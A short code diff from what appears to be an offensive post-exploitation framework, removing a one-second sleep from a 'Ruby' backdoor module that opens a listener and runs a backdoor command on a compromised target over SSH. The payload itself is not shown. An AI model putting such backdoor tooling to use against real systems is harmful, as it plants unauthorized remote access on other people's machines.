@@ -23,7 +23,6 @@ class Ruby(Backdoor):
 	def do_exploit(self, args):
 		print(GOOD + "Initializing backdoor...")
 		self.listen(prompt="none")
-		time.sleep(1)
 		self.core.curtarget.ssh.exec_command(self.get_command())
 		print(GOOD + "Ruby backdoor on " + str(self.get_value("port")) + " attempted.")
 
